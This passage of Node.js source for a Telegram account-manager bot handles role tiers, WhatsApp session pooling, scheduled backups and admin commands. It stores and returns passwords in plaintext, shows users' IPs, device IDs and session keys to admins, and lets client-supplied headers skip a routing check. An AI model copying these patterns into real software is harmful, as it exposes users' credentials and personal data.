    console.log(`[REGISTRY] 📋 ${registryCount} sesi terdaftar (tidak di-connect). Socket akan connect on-demand saat dibutuhkan.`);
}


const ROLE_WORKER_MAP = {
    'member': 'W0-MEMBER',
    'FULLUP': 'W0-FULLUP',
    'RESELLER': 'W0-RESELLER',
    'PT': 'W0-PT',
    'TK': 'W0-TK',
    'OWNER': 'W0-OWNER',
    'KINGZ': 'W0-KINGZ'
};

function assignWorker(user) {
    const role = normalizeRoleKey(user?.role);
    return ROLE_WORKER_MAP[role] || 'W0-MEMBER';
}

function canUseGlobalSender(role) {
    return ['FULLUP', 'RESELLER', 'PT', 'TK', 'OWNER', 'KINGZ'].includes(normalizeRoleKey(role));
}

function loadWorkers() {
    try {
        const file = path.join(__dirname, 'workers.json');
        if (!fs.existsSync(file)) return [];
        const data = JSON.parse(fs.readFileSync(file, 'utf8'));
        return Array.isArray(data) ? data : [];
    } catch {
        return [];
    }
}

function workerNameOf(worker) {
    return String(worker?.name || worker?.workerName || worker?.id || "").trim();
}

function workerRoleOf(worker) {
    return normalizeRoleKey(worker?.workerRole || worker?.role || worker?.roles);
}

function getWorkerEndpointForUser(user) {
    const workers = loadWorkers();
    const expectedWorker = assignWorker(user);
    const roleKey = normalizeRoleKey(user?.role);
    const targetWorker =
        workers.find(w => workerNameOf(w) === expectedWorker) ||
        workers.find(w => workerRoleOf(w) === roleKey && workerNameOf(w).startsWith("W0-")) ||
        workers.find(w => workerRoleOf(w) === "member" && workerNameOf(w).startsWith("W0-")) ||
        workers.find(w => workerNameOf(w).startsWith("W0-"));

    return { expectedWorker, roleKey, targetWorker };
}

function getRouteMismatchPayload(user, req) {
    if (req && req.headers['x-is-fallback'] === 'true') {
        console.log(`[ROUTE-MISMATCH] Fallback request allowed for user: ${user?.username}`);
        return null;
    }

    const currentWorker = process.env.WORKER_NAME || "";
    if (!currentWorker) return null;

    const { expectedWorker, roleKey, targetWorker } = getWorkerEndpointForUser(user);
    if (!expectedWorker || currentWorker === expectedWorker) return null;

    // Allow if current worker handles the same role as expected
    // e.g. W0-MEMBER vs W0-MEMBER-2 both handle MEMBER role
    const currentRole = (process.env.WORKER_ROLES || '').toUpperCase().trim();
    const expectedRoleFromName = expectedWorker.replace(/^W0-/, '').replace(/-\d+$/, '').toUpperCase();
    const userRoleUpper = (roleKey === 'member' ? 'MEMBER' : roleKey).toUpperCase();

    if (currentRole && (currentRole === expectedRoleFromName || currentRole === userRoleUpper)) {
        console.log(`[ROUTE-MISMATCH] Same role allowed: worker=${currentWorker}(${currentRole}) expected=${expectedWorker}(${expectedRoleFromName}) user=${user?.username} role=${roleKey}`);
        return null;
    }

    // Allow if proxy already verified the role matches
    const proxyRole = (req?.headers?.['x-proxy-role'] || '').toUpperCase().trim();
    if (proxyRole && currentRole && proxyRole === currentRole) {
        console.log(`[ROUTE-MISMATCH] Proxy role match allowed: worker=${currentWorker}(${currentRole}) proxyRole=${proxyRole} user=${user?.username}`);
        return null;
    }

    console.log(`[ROUTE-MISMATCH] BLOCKED: worker=${currentWorker}(${currentRole}) expected=${expectedWorker}(${expectedRoleFromName}) user=${user?.username} role=${roleKey} proxyRole=${proxyRole}`);

    return {
        routeMismatch: true,
        currentWorker,
        expectedWorker,
        targetWorker: targetWorker ? workerNameOf(targetWorker) : expectedWorker,
        role: roleKey === "member" ? "member" : roleKey,
        targetIp: targetWorker ? targetWorker.vpsIP : null,
        targetApiPort: targetWorker ? targetWorker.apiPort : null,
        targetWsPort: targetWorker ? targetWorker.wsPort : null,
        message: `Endpoint salah. Request ini masuk ke ${currentWorker}, harusnya ke ${expectedWorker}.`
    };
}

function loadGlobalSenderList() {
    try {
        if (!fs.existsSync(GLOBAL_SENDER_FILE)) fs.writeFileSync(GLOBAL_SENDER_FILE, '[]');
        return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE));
    } catch { return []; }
}

function saveGlobalSenderList(list) {
    try { fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(list, null, 2)); } catch { }
}

function getGlobalSender() {
    const poolList = loadGlobalSenderList();
    const poolActive = poolList.filter(n => activeConnections[n]);
    if (poolActive.length) return activeConnections[poolActive[Math.floor(Math.random() * poolActive.length)]];
    const memberSessions = Object.keys(activeConnections).filter(s =>
        normalizeRoleKey(sessionRoleMap[s]?.role) === 'member' || sessionRoleMap[s]?.worker === 'W0-MEMBER'
    );
    if (memberSessions.length) return activeConnections[memberSessions[Math.floor(Math.random() * memberSessions.length)]];
    return null;
}

async function getGlobalSenderCount() {
    const poolList = loadGlobalSenderList();
    const poolCount = poolList.filter(n => activeConnections[n]).length;
    if (poolCount > 0) return poolCount;
    return Object.keys(activeConnections).filter(s =>
        normalizeRoleKey(sessionRoleMap[s]?.role) === 'member' || sessionRoleMap[s]?.worker === 'W0-MEMBER'
    ).length;
}

const telegramDataPath = "telegram.json";


function loadTelegramConfig() {
    if (!fs.existsSync(telegramDataPath)) {
        fs.writeFileSync(telegramDataPath, JSON.stringify({
            ownerList: [],
            allowedGroups: [],
            groups: {}
        }, null, 2))
    }
    try {
        const data = JSON.parse(fs.readFileSync(telegramDataPath, "utf8"))
        return {
            ...data,
            ownerList: (data.ownerList || []).map(Number),
            allowedGroups: data.allowedGroups || [],
            groups: data.groups || {}
        }
    } catch {
        return { ownerList: [], allowedGroups: [], groups: {} }
    }
}

function saveTelegramConfig(data) {
    if (!data || typeof data !== "object") return
    fs.writeFileSync(telegramDataPath, JSON.stringify(data, null, 2))
}


const USERS_PER_PAGE = 10

function getFormattedUsers(page = 0) {
    const db = loadDatabase()
    if (!Array.isArray(db) || db.length === 0) {
        return "❌ Tidak ada user"
    }

    const start = page * USERS_PER_PAGE
    const end = start + USERS_PER_PAGE
    const slice = db.slice(start, end)

    let text = `📋 <b>DAFTAR USER otax</b>\n\n`
    for (const u of slice) {
        text += `👤 ${u.username} | 🎯 ${u.role || "member"} | ⏳ ${u.expiredDate ? formatDateExp(u.expiredDate) : "-"}\n`
    }

    const totalPage = Math.ceil(db.length / USERS_PER_PAGE)
    text += `\n📄 Page ${page + 1} / ${totalPage}`

    return text
}
function getUserListKeyboard(page = 0) {
    const totalPage = Math.ceil(loadDatabase().length / USERS_PER_PAGE)

    const buttons = []

    if (page > 0) buttons.push({ text: "⬅️ Back", callback_data: `list_user:${page - 1}` })
    if (page < totalPage - 1) buttons.push({ text: "Next ➡️", callback_data: `list_user:${page + 1}` })

    return { inline_keyboard: buttons.length ? [buttons] : [] }
}

async function downloadToBuffer(url) {
    try {
        const response = await axios.get(url, {
            responseType: 'arraybuffer'
        });
        return Buffer.from(response.data);
    } catch (error) {
        throw error;
    }
}


function isValidBaileysCreds(jsonData) {
    if (typeof jsonData !== 'object' || jsonData === null) return false;

    const requiredKeys = [
        'noiseKey',
        'signedIdentityKey',
        'signedPreKey',
        'registrationId',
        'advSecretKey',
        'signalIdentities'
    ];

    return requiredKeys.every(key => key in jsonData);
}
const telegramGroupPath = "telegram.json"
const VALID_GROUPS = ["FULLUP", "RESELLER", "PT", "TK", "OWNER"]
const LEGACY_TK_REPORT_GROUPS = [-1003486972998, -1003803373220]

function loadTelegramGroup() {
    const config = loadTelegramConfig()
    return config.groups || {}
}

function saveTelegramGroup(groupData) {
    if (!groupData || typeof groupData !== "object") return
    const config = loadTelegramConfig()
    config.groups = groupData
    saveTelegramConfig(config)
}

function getGroupRole(chatId) {
    const data = loadTelegramGroup()
    if (!data[String(chatId)]) return null
    return String(data[String(chatId)]).toLowerCase()
}

function getTelegramGroupsByRole(role) {
    const groups = loadTelegramGroup()
    const wantedRole = String(role || "").toUpperCase()
    return Object.entries(groups)
        .filter(([, value]) => String(value || "").toUpperCase() === wantedRole)
        .map(([groupId]) => Number(groupId))
        .filter(groupId => Number.isFinite(groupId))
}

function telegramUserHasAccount(tgId) {
    const db = loadDatabase()
    return db.some(u => u.telegramId === tgId)
}
const ROLE_PRIORITY = {
    FULLUP: 1,
    RESELLER: 2,
    PT: 3,
    TK: 4,
    OWNER: 5,
    KINGZ: 6
}
async function getUserRoleFromGroups(userId) {
    const groups = loadTelegramGroup()
    if (!groups || Object.keys(groups).length === 0) {
        throw new Error("Tidak ada konfigurasi grup (mencegah mass-purge)");
    }
    let finalRole = null
    let highest = 0
    let hadApiError = false

    for (const [groupId, role] of Object.entries(groups)) {
        try {
            const member = await bot.getChatMember(Number(groupId), userId)
            if (["member", "restricted", "administrator", "creator"].includes(member.status)) {
                const level = ROLE_PRIORITY[role]
                if (level && level > highest) {
                    highest = level
                    finalRole = role
                }
            }
        } catch (err) {
            const description = err.response?.body?.description || err.message || ""
            if (
                description.toLowerCase().includes("user not found") ||
                description.toLowerCase().includes("participant not found") ||
                description.toLowerCase().includes("chat not found")
            ) {
                continue
            }

            console.log(`[ROLE] ⚠️ API error saat cek grup ${groupId} untuk user ${userId}: ${description}`)
            hadApiError = true
            continue
        }
    }

    if (hadApiError && !finalRole) {
        throw new Error(`API Telegram error saat cek membership user ${userId} — hasil tidak reliable`)
    }

    return finalRole
}
async function resolveUserRole(userId) {
    const config = loadTelegramConfig()


    const ownerList = (config.ownerList || []).map(Number)
    if (ownerList.includes(Number(userId))) return "KINGZ"

    const role = await getUserRoleFromGroups(userId)
    if (role) return role

    return null
}
function escapeHTMLName(text = "") {
    return String(text)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;")
}
function getUserByTelegramId(id) {
    const db = loadDatabase()
    return db.find(u => Number(u.telegramId) === Number(id))
}
function resolveTelegramIdentity(msg) {
    return {
        id: msg.from.id,
        username: msg.from.username
            ? `@${msg.from.username}`
            : escapeHTMLName(msg.from.first_name || "Unknown")
    }
}

const cron = require("node-cron")

const BACKUP_DIR = path.join(__dirname, "backup")
if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true })

const BACKUP_STATE_FILE = path.join(__dirname, "backup_state.json")
const EXCLUDE_DIRS = ["node_modules", "backup", ".git", "otaxayun"]
const EXCLUDE_FILES = ["package.json", "package-lock.json"]

function loadBackupState() {
    try {
        if (fs.existsSync(BACKUP_STATE_FILE))
            return JSON.parse(fs.readFileSync(BACKUP_STATE_FILE, "utf8"))
    } catch (_) { }
    return { lastBackupDate: null, lastBackupHour: null }
}

function saveBackupState(hour) {
    const now = getNowWITA()
    const dateStr = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}`
    fs.writeFileSync(BACKUP_STATE_FILE, JSON.stringify({
        lastBackupDate: dateStr,
        lastBackupHour: hour,
        lastBackupTime: new Date().toISOString()
    }, null, 2))
}

function getNowWITA() {
    const now = new Date()
    const witaOffset = 8 * 60 * 60 * 1000
    return new Date(now.getTime() + witaOffset - (now.getTimezoneOffset() * 60000))
}

function scanJsonFiles(dir, list = []) {
    if (!fs.existsSync(dir)) return list
    for (const file of fs.readdirSync(dir)) {
        const full = path.join(dir, file)
        const stat = fs.statSync(full)
        if (stat.isDirectory()) {
            if (!EXCLUDE_DIRS.includes(file)) scanJsonFiles(full, list)
        } else if (file.endsWith(".json") && !EXCLUDE_FILES.includes(file)) {
            list.push(full)
        }
    }
    return list
}

function createZipBackup() {
    return new Promise((resolve, reject) => {
        const stamp = new Date().toISOString().replace(/[:.]/g, "-")
        const zipPath = path.join(BACKUP_DIR, `backup-${stamp}.zip`)
        const output = fs.createWriteStream(zipPath)
        const archive = archiver("zip", { zlib: { level: 9 } })
        output.on("close", () => resolve(zipPath))
        archive.on("error", reject)
        archive.pipe(output)
        for (const file of scanJsonFiles(__dirname)) {
            archive.file(file, { name: path.relative(__dirname, file) })
        }
        archive.finalize()
    })
}

function deleteAllBackups() {
    try {
        for (const f of fs.readdirSync(BACKUP_DIR)) {
            fs.unlinkSync(path.join(BACKUP_DIR, f))
        }
    } catch (_) { }
}

async function restoreFromZip(zipPath) {
    if (!fs.existsSync(zipPath)) throw new Error("File zip tidak ditemukan")
    await fs.createReadStream(zipPath)
        .pipe(unzipper.Extract({ path: __dirname }))
        .promise()
}

async function runBackup(label, hour) {
    console.log(`[BACKUP] ⏳ Memulai backup ${label} - ${new Date().toLocaleString("id-ID")}`)
    try {
        deleteAllBackups()
        const zip = await createZipBackup()
        if (hour !== null) saveBackupState(hour)
        console.log(`[BACKUP] ✅ Backup ${label} berhasil: ${zip}`)
        await bot.sendDocument('1925763520', zip, {
            caption:
                `<tg-emoji emoji-id="5258477770735885832">📄</tg-emoji> <b>Backup ${label}</b>\n` +
                `━━━━━━━━━━━━━━━━\n` +
                `<tg-emoji emoji-id="5258419835922030550">🕔</tg-emoji> ${new Date().toLocaleString('id-ID')}`,
            parse_mode: 'HTML'
        })
        return true
    } catch (err) {
        console.error(`[BACKUP] ❌ Backup ${label} gagal: ${err.message}`)
        return false
    }
}

function checkMissedBackup() {
    const now = getNowWITA()
    const hour = now.getHours()
    const minute = now.getMinutes()
    const dateStr = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()}`
    const state = loadBackupState()

    if (hour === 0 && minute <= 55) {
        if (state.lastBackupDate !== dateStr || state.lastBackupHour !== 0) {
            console.log("[BACKUP] ⚠️ Backup tengah malam terlewat, jalankan sekarang...")
            runBackup("tengah-malam (missed)", 0)
            return
        }
    }

    if (hour === 12 && minute <= 55) {
        if (state.lastBackupDate !== dateStr || state.lastBackupHour !== 12) {
            console.log("[BACKUP] ⚠️ Backup siang terlewat, jalankan sekarang...")
            runBackup("siang (missed)", 12)
            return
        }
    }

    console.log(`[BACKUP] ✔️ Scheduler aktif | Waktu WITA: ${now.toLocaleString("id-ID")}`)
}

setTimeout(() => checkMissedBackup(), 3000)

cron.schedule("0 0 * * *", () => {
    runBackup("tengah-malam", 0)
}, { timezone: "Asia/Makassar" })

cron.schedule("0 12 * * *", () => {
    runBackup("siang", 12)
}, { timezone: "Asia/Makassar" })

setInterval(() => { }, 5000)
bot.onText(/^\/?cek(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const targetUserId = match[1] ? match[1].trim() : null;
    const fromId = msg.from.id;

    const allowedIds = [OWNER_ID, 7027155167, 6252224704];
    if (!allowedIds.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
    }

    if (!targetUserId) {
        return bot.sendMessage(chatId, '❌ Format salah. Gunakan: `/cek userid`', { parse_mode: 'Markdown' });
    }

    const username = targetUserId.toLowerCase();

    try {
        if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
        if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

        const db = JSON.parse(fs.readFileSync("database.json"));
        const keys = JSON.parse(fs.readFileSync("keyList.json"));

        const dbUser = db.find(u => (u.username || "").toLowerCase() === username || (u.telegramId && String(u.telegramId) === targetUserId));
        const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

        if (!dbUser && !keyUser) {
            return bot.sendMessage(chatId, `❌ Target \`${targetUserId}\` tidak ditemukan di database.`, { parse_mode: 'Markdown' });
        }

        const role = dbUser?.role || "member";
        const expired = dbUser?.expiredDate ? formatDateExp(dbUser.expiredDate) : "Tidak ada";
        const lastSend = dbUser?.lastSend
            ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
            : "Belum pernah";

        const lastLogin = keyUser?.lastLogin
            ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
            : "Belum login";
        const ip = keyUser?.ipAddress || "Tidak diketahui";
        const android = keyUser?.androidId || "-";
        const session = keyUser?.sessionKey || "-";

        const creatorName = dbUser?.createdByName || dbUser?.createdBy || '-';
        const creatorTgId = dbUser?.createdById || '-';
        const userTgId = dbUser?.telegramId || '-';
        const createdAt = dbUser?.createdAt
            ? new Date(dbUser.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
            : '-';

        const info = `
*INFORMASI AKUN / TARGET*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`

*── Info Kreator ──*
*Dibuat Oleh:* ${creatorName}
*ID Telegram Kreator:* \`${creatorTgId}\`
*ID Telegram User:* \`${userTgId}\`
*Dibuat Pada:* ${createdAt}
`.trim();

        bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
    } catch (e) {
        bot.sendMessage(chatId, '❌ Terjadi kesalahan saat membaca database.');
        console.error(e);
    }
});


bot.onText(/^\/?delmanta$/i, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID && ![7027155167, 6252224704].includes(fromId)) {
        const config = loadTelegramConfig();
        const ownerList = Array.isArray(config.ownerList) ? config.ownerList : [];
        if (!ownerList.includes(fromId)) {
            return bot.sendMessage(chatId, "❌ Akses Ditolak! Hanya OWNER yang bisa menggunakan perintah ini.");
        }
    }

    const db = loadDatabaseFresh();
    let initialCount = db.length;

    const newDb = db.filter(u => {
        const uname = (u.username || "").trim().toLowerCase();
        if (uname === "manta" && u.role === "KINGZ") return true;
        if (uname === "manta" && u.role !== "KINGZ") return false;
        return true;
    });

    const deletedCount = initialCount - newDb.length;
    saveDatabase(newDb);

    bot.sendMessage(chatId, `✅ Eksekusi Selesai! Berhasil membersihkan ${deletedCount} akun palsu yang mengandung unsur nama 'manta'.`);
});

bot.onText(/^\/?(start|menu)/, async (msg) => {
    const id = msg.from.id
    clearUserFlow(id)
    const config = loadTelegramConfig()
    const isOwner = config.ownerList.includes(id)
    const name = escapeHTMLName(msg.from.first_name)

    const text = `
<b> MANTA ACCOUNT MANAGER</b>

<blockquote>
👋 Hai <b>${name}</b>

Bot ini digunakan untuk <b>pembuatan & manajemen akun</b> secara otomatis dan aman.

<b>📌 Cara Membuat Akun:</b>
1️⃣ Pastikan kamu tergabung di <b>grup resmi MANTA</b>
2️⃣ Klik tombol <b>🆕 Buat Akun</b>
3️⃣ Masukkan data akun sesuai format yang diminta

<b>⚠️ Ketentuan:</b>
• 1 Telegram = 1 akun
• Akun akan <b>terhapus otomatis</b> jika keluar dari grup
• Masa aktif mengikuti durasi yang ditentukan

<b>🔒 Keamanan:</b>
Akun terikat ke Telegram & grup
Tidak bisa dipindahkan ke device lain
</blockquote>

<b>🌐 by TEAM MANTA</b>
`

    const role = await resolveUserRole(id);
    const isTK = role === "TK";
    const isMe = role === "OWNER";

    const options = {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "🆕 Buat Akun", callback_data: "create_member" }],

                ...(isTK || isMe ? [[
                    { text: "🏍️ Buat Akun Buyyer", callback_data: "create_member_tk" },
                    {
                        text: "📋 Cek Akun Member",
                        callback_data: "cek_member_saya"
                    },
                    {
                        text: "🗑 Hapus Member Saya",
                        callback_data: "hapus_member_saya"
                    }
                ]] : []),

                [{ text: "📄 Cek Akun Saya", callback_data: "cek_akun" }],
                [{ text: "🗑 Hapus Akun Saya", callback_data: "del_akun" }],

                ...(isOwner ? [[
                    { text: "⏳ Set Expired", callback_data: "set_expire" },
                    { text: "📋 List User", callback_data: "list_user" }
                ], [
                    { text: "🎛 Buat Custom User", callback_data: "create_custom" },
                    { text: "🗑 Hapus User", callback_data: "delete_user" },
                    { text: "🗑 Clear Member >30d", callback_data: "delmemb" }
                ]] : [])
            ]
        }
    }

    bot.sendMessage(msg.chat.id, text, options)
})
bot.onText(/^\/?cekoi$/, async msg => {
    try {
        const chatId = msg.chat.id
        const id = msg.from.id

        if (id !== OWNER_ID) return

        const db = loadDatabase()

        const members = db.filter(u =>
            u.role === "member" &&
            u.accountType !== "BUYER" &&
            !u.createdById
        )

        let list = members
            .map((u, i) => `${i + 1}. ${u.username} (${u.telegramId || "-"})`)
            .join("\n")

        if (!list) list = "Tidak ada"

        bot.sendMessage(chatId, `
📊 <b>MEMBER NON-TK</b>

Total : <b>${members.length}</b>

${list}
`, { parse_mode: "HTML" })
    } catch { }
})
bot.onText(/^\/?deloi$/, async msg => {
    try {
        const chatId = msg.chat.id
        const id = msg.from.id

        if (id !== OWNER_ID) return

        const db = loadDatabase()
        const remain = []
        const deleted = []

        for (const u of db) {
            if (
                u.role === "member" &&
                u.accountType !== "BUYER" &&
                !u.createdById &&
                u.telegramId &&  // HANYA hapus yang punya telegramId (akun dari Telegram)
                !u.createdBy     // JANGAN hapus akun yang dibuat lewat APK (punya createdBy)
            ) {
                deleted.push(u)
            } else {
                remain.push(u)
            }
        }

        if (deleted.length === 0) {
            return bot.sendMessage(chatId, "✅ Tidak ada member non-TK yang perlu dihapus")
        }

        saveDatabase(remain)

        bot.sendMessage(chatId, `
🗑️ <b>DELETE MEMBER NON-TK</b>

Total dihapus : <b>${deleted.length}</b>
ℹ️ Member APK AMAN (tidak dihapus)
`, { parse_mode: "HTML" })
    } catch { }
})
bot.onText(/^\/panel(?:\s+(.+))?/, async (msg, match) => {
    if (msg.from.id !== OWNER_ID) return;
    if (msg.chat.type !== "private") return;

    const input = match[1];
    if (!input) {
        return bot.sendMessage(
            msg.chat.id,
            "❌ Format salah!\nGunakan: `/panel domain,ptla_xxx,ptlc_yyy,limit`\nContoh:\n`/panel https://panel.otax.fun,ptla_...,ptlc_...,15`",
            { parse_mode: "Markdown" }
        );
    }

    try {
        const parts = input.split(',');
        if (parts.length < 4) {
            return bot.sendMessage(msg.chat.id, "❌ Format salah! Pastikan ada 4 bagian yang dipisah koma (domain, ptla, ptlc, limit).");
        }

        const domain = parts[0].trim();
        const ptla = parts[1].trim();
        const ptlc = parts[2].trim();
        const limit = parseInt(parts[3].trim());

        if (isNaN(limit)) {
            return bot.sendMessage(msg.chat.id, "❌ Limit harus berupa angka.");
        }

        let panels = [];
        if (fs.existsSync(PANELS_FILE)) {
            panels = JSON.parse(fs.readFileSync(PANELS_FILE));
        }

        const newPanel = {
            id: `panel_${Date.now()}`,
            domain: domain,
            ptla: ptla,
            ptlc: ptlc,
            limit: limit,
            usage: 0
        };

        panels.push(newPanel);
        fs.writeFileSync(PANELS_FILE, JSON.stringify(panels, null, 2));

        return bot.sendMessage(
            msg.chat.id,
            `✅ *Panel Berhasil Ditambahkan!*\n\n🌐 *Domain:* ${domain}\n📊 *Limit:* ${limit}\n\nKini server bot akan dirotasi secara otomatis ke panel ini jika slot masih tersedia.`,
            { parse_mode: "Markdown" }
        );
    } catch (e) {
        return bot.sendMessage(msg.chat.id, `❌ Terjadi kesalahan: ${e.message}`);
    }
});

bot.onText(/^\/msg(?:\s+(.+))?/, async (msg, match) => {
    if (msg.from.id !== OWNER_ID) return;
    if (msg.chat.type !== "private") return;

    let text = match[1];

    if (!text && msg.reply_to_message) {
        text = msg.reply_to_message.text;
    }

    if (!text) {
        return bot.sendMessage(
            msg.chat.id,
            "❌ Gunakan:\n/msg pesan\natau reply pesan + /msg"
        );
    }

    try {
        console.log("🤖 [BOT] /msg command received from:", msg.from.username);
        console.log("📝 Message text:", text);


        const notifications = loadNotifications();
        console.log("📋 Current notifications count:", notifications.length);


        if (!Array.isArray(notifications)) {
            console.log("⚠️ notifications is not array, resetting...");
            saveNotifications([]);
            console.log("✅ notifications reset to empty array");
            return bot.sendMessage(msg.chat.id, "❌ Error: Data notifikasi rusak, coba lagi.");
        }


        const newNotification = {
            id: Date.now(),
            title: "📢 Pengumuman Owner",
            message: text,
            createdAt: new Date().toISOString(),
        };

        console.log("➕ Adding new notification:", newNotification);


        notifications.unshift(newNotification);


        saveNotifications(notifications);

        console.log("💾 Saved successfully. New count:", notifications.length);


        try {

            const wss = getWebSocketServer(); // Anda perlu memiliki fungsi ini
            if (wss) {
                wss.clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({
                            type: 'notification',
                            data: newNotification
                        }));
                    }
                });
                console.log("📡 Broadcasted to WebSocket clients");
            }
        } catch (wsError) {
            console.log("⚠️ Could not broadcast to WebSocket:", wsError.message);
        }

        bot.sendMessage(msg.chat.id, "✅ Notifikasi berhasil dikirim ke semua user");

    } catch (error) {
        console.error("❌ Error in /msg command:", error);
        bot.sendMessage(msg.chat.id, "❌ Terjadi kesalahan saat menyimpan notifikasi: " + error.message);
    }
});
bot.onText(/^\/deltk(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id
    const userId = msg.from.id

    const cfg = loadTelegramConfig() || {}
    const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []
    const isOwner = ownerList.includes(userId)
    if (!isOwner) return

    const arg = (match?.[1] || "").trim()
    if (!arg) return bot.sendMessage(chatId, "❌ Masukkan username / id")

    const db = loadDatabase()

    const idx = db.findIndex(u =>
        u.accountType === "BUYER" &&
        (u.username === arg || String(u.createdById) === String(arg))
    )

    if (idx === -1) return bot.sendMessage(chatId, "❌ Member tidak ditemukan")

    const removed = removeUserFromDatabase(db, idx)
    saveDatabase(db)

    return bot.sendMessage(chatId, `
🗑 <b>MEMBER TK DIHAPUS OWNER</b>

👤 <b>${removed.username}</b>
Creator ID: <code>${removed.createdById}</code>
`, { parse_mode: "HTML" })
})

bot.onText(/^\/delmemb$/i, async (msg) => {
    const chatId = msg.chat.id
    const userId = msg.from.id

    const cfg = loadTelegramConfig() || {}
    const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []
    if (!ownerList.includes(userId)) return

    const db = loadDatabase()
    const now = Date.now()
    let count = 0
    const deletedNames = []

    const filteredDb = db.filter(u => {
        if (u.role === "member") {
            const exp = parseUserExpiredMs(u.expiredDate)
            if (!isNaN(exp) && exp < now) {
                count++
                deletedNames.push(u.username)
                for (const k in activeKeys) {
                    if (activeKeys[k].username === u.username) {
                        delete activeKeys[k]
                    }
                }
                return false
            }
        }
        return true
    })

    if (count === 0) {
        return bot.sendMessage(chatId, "✅ Tidak ditemukan akun member yang sudah expired.")
    }

    saveDatabase(filteredDb)
    bot.sendMessage(chatId, `✅ Berhasil menghapus <b>${count}</b> akun member yang sudah expired.\n\n${deletedNames.slice(0, 10).join(', ')}${deletedNames.length > 10 ? ' ...' : ''}`, { parse_mode: "HTML" })
})

bot.onText(/^\/refresh/, async (msg) => {
    const config = loadTelegramConfig()
    if (!config.ownerList.includes(msg.from.id)) return
    await refreshUserSessions()
    bot.sendMessage(msg.chat.id, "⚠️ Server refreshing 30-60 detik")
})

bot.onText(/^\/globalsession/, async (msg) => {
    if (msg.from.id !== OWNER_ID) return
    if (msg.chat.type === "private") return

    let message = `📌 Global Session\n\n`
    message += "Messenger:\n" + (Object.keys(mess).join("\n") || "❌ None")
    message += "\n\nBusiness:\n" + (Object.keys(biz).join("\n") || "❌ None")
    message += "\n\nActive:\n" + (Object.keys(activeConnections).join("\n") || "❌ None")

    bot.sendMessage(msg.chat.id, message)
})
const userProof = new Map()
const VALID_ROLES = ["FULLUP", "RESELLER", "PT", "TK", "OWNER", "KINGZ"]
const userState = new Map()
const userFlowMeta = new Map()

function clearUserFlow(userId) {
    userState.delete(userId)
    userProof.delete(userId)
    userFlowMeta.delete(userId)
}

function setUserFlow(userId, step, meta = {}) {
    userState.set(userId, step)
    userFlowMeta.set(userId, {
        step,
        chatId: meta.chatId ?? null,
        promptMessageId: meta.promptMessageId ?? null,
        createdAt: Date.now()
    })
}

function getUserFlow(userId) {
    return userFlowMeta.get(userId) || null
}
bot.on("callback_query", async q => {
    if (!q || !q.from) return

    const userId = q.from.id
    const msg = q.message || {}
    const chatId = msg.chat?.id
    const chatType = msg.chat?.type

    const cfg = loadTelegramConfig() || {}
    const ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : []
    const isOwner = ownerList.includes(userId)
    const isPrivate = chatType === "private"
    try { await bot.answerCallbackQuery(q.id) } catch { }

    if (q.data === "cek_akun") {
        const db = loadDatabase()
        const user = db.find(u => u.telegramId === userId)
        if (!user) {
            if (isPrivate) {
                return bot.sendMessage(chatId, "❌ Kamu belum pernah membuat akun")
            }
            return
        }
        return bot.sendMessage(userId, `
<b>📄 AKUN KAMU</b>

👤 Username: <b>${user.username}</b>
🔑 Password: <b>${user.password}</b>
🎯 Role: <b>${user.role.toUpperCase()}</b>
⏳ Expired: <b>${formatDateExp(user.expiredDate)}</b>
`, { parse_mode: "HTML" })
    }

    if (q.data === "del_akun") {
        const db = loadDatabase()
        const i = db.findIndex(u => u.telegramId === userId)
        if (i === -1) {
            if (isPrivate) {
                return bot.sendMessage(chatId, "❌ Kamu tidak punya akun")
            }
            return
        }
        const u = db[i]
        db.splice(i, 1)
        saveDatabase(db)
        return bot.sendMessage(userId, `
🗑 <b>AKUN DIHAPUS</b>

👤 <b>${u.username}</b>
Sekarang kamu bisa membuat akun kembali
`, { parse_mode: "HTML" })
    }

    if (!isPrivate) {
        return bot.sendMessage(chatId, `
<b>🔒 MANTA SECURITY</b>

<blockquote>
Proses hanya dapat dilanjutkan
melalui <b>PRIVATE CHAT</b>
</blockquote>
`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔐 Buka Private Bot", url: "https://t.me/mantaxapkbot?start=menu" }]
                ]
            }
        })
    }

    if (q.data === "create_member") {
        clearUserFlow(userId)
        if (telegramUserHasAccount(userId)) {
            return bot.sendMessage(chatId, "❌ Kamu sudah punya akun")
        }
        const role = await resolveUserRole(userId)
        if (!role) {
            return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses")
        }
        const sent = await bot.sendMessage(chatId, `
<b>🆕 MANTA ACCOUNT CREATION</b>

Role: <b>${role.toUpperCase()}</b>

